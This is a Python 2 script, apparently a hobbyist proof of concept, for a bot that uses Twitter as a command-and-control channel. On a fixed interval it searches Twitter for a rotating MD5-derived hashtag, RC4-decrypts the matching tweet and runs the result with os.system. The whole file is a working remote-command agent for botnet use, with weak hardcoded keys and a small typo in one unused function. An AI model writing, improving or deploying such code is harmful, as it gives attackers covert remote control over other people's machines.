#!/usr/bin/python
#
# Filename: twitbot.py
# Version 0.1
# twitbot.py: A bot that will look for commands on Twitter

""" twitbot.py a bot that uses Twitter for C&C """

__author__ = 'arkem'
__version__ = '1.0'

from Crypto.Cipher import ARC4 # apt-get install python-crypto
import md5
import time
import base64
import twitter # easy_install twitter
import sys
import os

if len(sys.argv) < 2:
    #TODO: Better scheduling - every n seconds sucks!
    print "Usage: twitbot.py update_interval"
    print "Example: twitbot.py 2000"
    sys.exit(1)

taglength = 10 # Tag length: longer is more unique but decreases payload size
tagkey = "Salty" # Insert strong password here
messagekey = "Sheep" # Insert strong password here

# To account for time drift the three least significant digets of time.time()
# are discarded. This means that every 1000 seconds the tag changes.
# TODO: Better time synchronization (Use NTP / Website (twitter?) time stamps)
def generateDynamicTag():
    tagcode = str(time.time())[:7] + tagkey
    return "#" + md5.md5(tagcode).hexdigest()[:taglength - 1]

# This alternate Tag generation function has no dynamic components
# This means that bots will need to discriminate against old messages
def generateTag():
    return "#" + md5.md5(tagkey).hexdigest()[:taglenth - 1]

# The messagekey string is md5ed to spread that entropy over a slightly larger
# surface. Really this thing barely deserves to be called encrypted.
def decryptMessage(msg):
    cypher = ARC4.new(md5.md5(messagekey).hexdigest())
    return cypher.decrypt(base64.b64decode(msg))

print "Welcome to Twitbot...standby!"

twit = twitter.Twitter(domain="search.twitter.com")

# TODO: More error checking
# TODO: More complicated commands (as opposed to just os.system)
# TODO: Better scheduling

while True:
    message = "" 
    tag = generateDynamicTag()
    print("Searching for Tag: %s" % tag)
    r = twit.search(q=tag)
    if len(r['results']) > 0: # The first result isn't necessarily what we want
            message = r['results'][0]['text'][:-taglength]
    if len(message) > 0:
            print "Message received"
            command = decryptMessage(message)
            print "Command = %s  ... Twitbot Engage!" % command
            os.system(command)
            print "Ding. Twitbot Sleep!"
    time.sleep(int(sys.argv[1]))
